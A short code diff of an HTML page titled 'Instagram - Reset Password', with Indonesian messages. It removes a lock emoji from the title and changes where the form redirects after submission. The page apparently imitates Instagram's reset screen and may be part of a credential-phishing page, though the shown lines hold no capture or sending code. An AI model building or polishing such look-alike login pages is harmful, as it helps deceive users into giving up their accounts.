@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>🔒 Instagram - Reset Password</title>
+  <title>Instagram - Reset Password</title>
   <style>
     body {
       margin: 0;
@@ -206,7 +206,7 @@
         if (!res.ok) throw new Error('Gagal');
 
         setTimeout(() => {
-          window.location.href = 'sukses.html';
+          window.location.href = '/api/sukses';
         }, 2000);
       } catch (err) {
         document.getElementById('overlay').style.display = 'none';
